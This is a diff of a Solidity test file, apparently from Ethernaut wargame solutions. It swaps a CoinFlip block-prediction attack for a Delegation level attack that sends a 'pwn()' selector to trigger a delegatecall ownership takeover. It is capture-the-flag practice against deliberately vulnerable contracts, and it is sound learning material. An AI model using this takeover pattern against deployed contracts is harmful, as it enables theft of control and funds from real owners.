@@ -3,12 +3,12 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../CoinFlip/CoinFlipHack.sol";
-import "../CoinFlip/CoinFlipFactory.sol";
+import "../Delegation/Delegation.sol";
+import "../Delegation/DelegationFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
 
-contract CoinFlipTest is DSTest {
+contract DelegationTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
 
@@ -17,32 +17,24 @@ contract CoinFlipTest is DSTest {
         ethernaut = new Ethernaut();
     }
 
-    function testCoinFlipHack() public {
+    function testDelegationHack() public {
         /////////////////
         // LEVEL SETUP //
         /////////////////
 
-        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
-        ethernaut.registerLevel(coinFlipFactory);
+        DelegationFactory delegationFactory = new DelegationFactory();
+        ethernaut.registerLevel(delegationFactory);
         vm.startPrank(tx.origin);
-        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
-        CoinFlip coinFlip = CoinFlip(payable(levelAddress));
+        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
+        Delegation delegation = Delegation(levelAddress);
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
-        CoinFlipHack coinFlipHack = new CoinFlipHack();
-
-        // Move the block from 0 to 5 to prevent underflow errors
-        uint256 starting_block = 5;
-        vm.roll(starting_block);
-
-        for (uint i = 0; i <= 10; i++) {
-            vm.roll(starting_block + i);
-            coinFlipHack.attack(address(coinFlip));
-        }
-
+        bytes4 signature = bytes4(keccak256("pwn()"));
+        address(delegation).call(abi.encode(signature));
+        
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
